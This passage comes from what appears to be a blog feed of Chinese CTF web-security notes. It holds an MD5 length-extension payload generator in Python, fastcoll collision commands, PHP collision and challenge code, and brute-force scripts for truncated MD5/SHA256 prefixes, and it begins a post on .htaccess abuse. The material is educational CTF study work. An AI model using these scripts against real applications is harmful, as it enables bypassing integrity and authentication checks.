class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + <span class="built_in">int</span>(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_b = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + <span class="built_in">int</span>(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_c = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_d = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + <span class="built_in">int</span>(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">        Ti_count = <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line">    <span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_lea</span>(<span class="params">suffix, res, len_m</span>):</span><br><span class="line">    <span class="keyword">global</span> Ti_count</span><br><span class="line">    Ti_count = <span class="number">1</span></span><br><span class="line">    abcd_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>):</span><br><span class="line">        abcd_list.append(reverse_hex(<span class="string">&#x27;0x&#x27;</span> + res[i: i + <span class="number">8</span>]))</span><br><span class="line">    <span class="comment"># print(abcd_list)</span></span><br><span class="line">    ascii_list = padding(suffix, (len_m + <span class="number">72</span>) // <span class="number">64</span> * <span class="number">64</span> * <span class="number">8</span>)  <span class="comment"># len(message + padding) * 8</span></span><br><span class="line">    <span class="comment"># print(ascii_list)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ascii_list) // <span class="number">64</span>):</span><br><span class="line">        aa, bb, cc, dd = abcd_list</span><br><span class="line">        order_1 = gen_m16(m_1, ascii_list, i)</span><br><span class="line">        order_2 = gen_m16(m_2, ascii_list, i)</span><br><span class="line">        order_3 = gen_m16(m_3, ascii_list, i)</span><br><span class="line">        order_4 = gen_m16(m_4, ascii_list, i)</span><br><span class="line">        abcd_list = fun(abcd_list, F, order_1, shi_1)</span><br><span class="line">        abcd_list = fun(abcd_list, G, order_2, shi_2)</span><br><span class="line">        abcd_list = fun(abcd_list, H, order_3, shi_3)</span><br><span class="line">        abcd_list = fun(abcd_list, I, order_4, shi_4)</span><br><span class="line">        output_a = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">0</span>], <span class="number">16</span>) + <span class="built_in">int</span>(aa, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_b = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">1</span>], <span class="number">16</span>) + <span class="built_in">int</span>(bb, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_c = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">2</span>], <span class="number">16</span>) + <span class="built_in">int</span>(cc, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        output_d = <span class="built_in">hex</span>((<span class="built_in">int</span>(abcd_list[<span class="number">3</span>], <span class="number">16</span>) + <span class="built_in">int</span>(dd, <span class="number">16</span>)) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">        abcd_list = [output_a, output_b, output_c, output_d]</span><br><span class="line">        Ti_count = <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(ascii_list)</span></span><br><span class="line">    <span class="keyword">return</span> show_result(abcd_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_append</span>(<span class="params">hex_bit</span>):</span><br><span class="line">    len_append = <span class="string">&#x27;0x&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>( (<span class="number">18</span>-<span class="built_in">len</span>(hex_bit))*<span class="string">&#x27;0&#x27;</span>, hex_bit[<span class="number">2</span>:])</span><br><span class="line">    len_append = reverse_hex(len_append)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(len_append)</span></span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(len_append)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> ==<span class="number">0</span> :</span><br><span class="line">            t += <span class="string">&#x27;%&#x27;</span>+len_append[i:i+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    修改res为已知哈希值</span></span><br><span class="line"><span class="string">    extend 为拓展值</span></span><br><span class="line"><span class="string">    自动遍历出1-30长度的payload url编码表达式</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    res = <span class="string">&#x27;1c3de59d2f68788cc792e0eb7d604710&#x27;</span></span><br><span class="line">    extend = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="comment"># print(reverse_hex(&#x27;0x&#x27; + res))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>):</span><br><span class="line">        hex_bit = <span class="built_in">hex</span>(i*<span class="number">8</span>)</span><br><span class="line">        t = url_append(hex_bit)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[%d]&#x27;</span> % i,md5_lea(extend,res,i))</span><br><span class="line">        <span class="comment"># print(&#x27;&#123;&#125;%80&#123;&#125;&#123;&#125;&#123;&#125;&#x27;.format(&#x27;X&#x27;*i, (55-i)*&#x27;%00&#x27;,t, extend) )</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%80&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>((<span class="number">55</span>-i)*<span class="string">&#x27;%00&#x27;</span>,t, extend) )</span><br><span class="line">        <span class="comment"># print(&#x27;&#123;&#125;&#123;&#125;&#x27;.format( hex(i), (18-len(hex(i)))*&#x27;0&#x27;) )</span></span><br><span class="line">    <span class="comment"># from urllib.parse import unquote</span></span><br><span class="line">    <span class="comment"># print(md5_lea(&#x27;kingkk&#x27;,&#x27;571580b26c65f306376d4f64e53cb5c7&#x27;,10))</span></span><br></pre></td></tr></table></figure><h4 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h4><h5 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h5><p>hashpump是一个专门生成MD5长度拓展攻击payload的工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Github仓库：https://github.com/bwall/HashPump</span><br></pre></td></tr></table></figure><blockquote><p><strong>现在被作者删了找不到了</strong></p></blockquote><h5 id="hash-ext-attack"><a href="#hash-ext-attack" class="headerlink" title="hash-ext-attack"></a>hash-ext-attack</h5><p>推荐中文项目:<a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><h2 id="MD5前缀构造法"><a href="#MD5前缀构造法" class="headerlink" title="MD5前缀构造法"></a>MD5前缀构造法</h2><h3 id="工具：fastcoll"><a href="#工具：fastcoll" class="headerlink" title="工具：fastcoll"></a>工具：fastcoll</h3><p>原理是构造两个不一样的字符串，但是MD5是一样</p><p>通过构造前缀碰撞法”（chosen-prefix collisions）来进行哈希碰撞（<strong>也可以构造两个MD5相同的文件</strong>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p 2.pdf -o 3.pdf 4.pdf</span><br><span class="line">fastcoll_v1.0.0.5.exe -p test.txt -o 3.txt 4.txt</span><br></pre></td></tr></table></figure><blockquote><p>文件内的内容为你想构造的前缀</p></blockquote><p>输出两个txt文本后：<strong>在php环境中运行Md5collision.php</strong></p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ20241002-210608.png"></p><p>可以看到，二进制的hash一样。 但是实际内容不一样。</p><h3 id="Md5collision-php"><a href="#Md5collision-php" class="headerlink" title="Md5collision.php"></a>Md5collision.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;¶þ½øÖÆhash &#x27;</span>. <span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;URLENCODE &#x27;</span>. <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;URLENCODE hash &#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urlencode</span> (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;3.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;¶þ½øÖÆhash &#x27;</span>.<span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;URLENCODE &#x27;</span>.  <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;URLENCODE hash &#x27;</span>.<span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;4.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ20241002-210608.png"></p><p><strong>可以看到前面相同的内容是我们构造的前缀</strong>，最后形成了两个字符串不同但二进制哈希值相同的字符串</p><h3 id="适用题型"><a href="#适用题型" class="headerlink" title="适用题型"></a>适用题型</h3><p>适用于<strong>字符串拼接类型</strong>，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="variable">$master</span> = <span class="string">&quot;MD5 master!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>] !== <span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master1&quot;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$master</span>.<span class="variable">$_POST</span>[<span class="string">&quot;master2&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$master</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;master? &lt;br&gt;&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="NAN和INF"><a href="#NAN和INF" class="headerlink" title="NAN和INF"></a>NAN和INF</h2><p>NAN和INF，分别为非数值和无穷大。当一个运算无法计算结果时，就会产生NAN，可以通过<code>0/0</code>产生；而当数值超过PHP_FLOAT_MAX或者使用一些数学函数产生极大或极小的结果时，就会得到INF。</p><p>但是var_dump它们数据类型却是<strong>double</strong></p><p><img src="/2025/03/27/MD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/QQ20250117-114214.png"></p><p>那么在MD5函数处理他们时，是将其直接转化为字符串”NAN”和字符串”INF”使用的，但他们有个特殊的性质，<strong>他们与任何数据类型(除了true)做强类型或弱类型比较均为false，甚至NAN&#x3D;&#x3D;&#x3D;NAN都是false(<code>INF===INF为true</code>)，但<code>md5(&#39;NAN&#39;)===md5(&#39;NAN&#39;)和md5(&#39;INF&#39;)===md5(&#39;INF&#39;)为true</code>.</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;INF&#x27;</span>)===<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;INF&#x27;</span>));  <span class="comment">//bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;NAN&#x27;</span>)===<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;NAN&#x27;</span>));  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><h2 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h2><h3 id="md5截断爆破"><a href="#md5截断爆破" class="headerlink" title="md5截断爆破"></a>md5截断爆破</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(?),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findmd5</span>(<span class="params">sss</span>):    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findmd5, <span class="built_in">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure><h3 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha256</span>(?),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256((<span class="string">&#x27;TQLCTF&#x27;</span>+<span class="built_in">str</span>(s)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>   <span class="comment">#已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):    <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> sha1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>.htaccess利用总结</title>
      <link href="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>.htaccess是Apache服务器中的一个配置文件，里面存放着Apache服务器配置相关的指令。通过.htaccess文件我们能实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许、阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<code>.htaccess</code>中<strong>注释符有<code>#</code>且支持<code>\</code>拼接上下两行。</strong></p><p>启动<code>.htaccess</code>我们需要将apache配置文件中的AllowOverride选项设置为All（默认为None）</p><p>需要注意的是<code>.htaccess</code>配置文件中的指令只对当前目录及其子目录生效，如果子目录也存在<code>.htaccess</code>文件，则子目录的配置优先于父目录，即<strong>子目录中的指令会覆盖父目录或者主配置中的指令。</strong></p><h2 id="常见使用方法"><a href="#常见使用方法" class="headerlink" title="常见使用方法"></a>常见使用方法</h2><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>可以设置允许或禁止所有IP访问某文件或者禁止某IP访问，文件名可使用通配符和正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 禁止访问 .git、.env 等文件</span><br><span class="line">&lt;FilesMatch &quot;\.(env|git|sql|bak|ini)$&quot;&gt;</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all   #禁止所有访问</span><br><span class="line">    Deny from 1.1.1.1 #禁止IP为1.1.1.1访问</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="目录重定向"><a href="#目录重定向" class="headerlink" title="目录重定向"></a>目录重定向</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Redirect 301 /old /new</span><br></pre></td></tr></table></figure><p><strong>该规则会将&#x2F;old目录重定向到&#x2F;new目录</strong></p><h3 id="自定义错误页面"><a href="#自定义错误页面" class="headerlink" title="自定义错误页面"></a>自定义错误页面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ErrorDocument 404 /errors/404.html</span><br><span class="line">ErrorDocument 500 /errors/500.html</span><br></pre></td></tr></table></figure><h3 id="URL-重定向与重写"><a href="#URL-重定向与重写" class="headerlink" title="URL 重定向与重写"></a>URL 重定向与重写</h3><p>该功能主要通过主要通过 <code>mod_rewrite</code> 模块实现，如文件扩展名处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 隐藏.html扩展名（访问/about → about.html）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; !-d   #排查目录</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125;.html -f #检测html目录是否存在</span><br><span class="line">RewriteRule ^([^\.]+)$ $1.html  #重写规则</span><br><span class="line"></span><br><span class="line"># 强制添加斜杠（防止目录访问404）</span><br><span class="line">RewriteCond %&#123;REQUEST_FILENAME&#125; -d</span><br><span class="line">RewriteRule 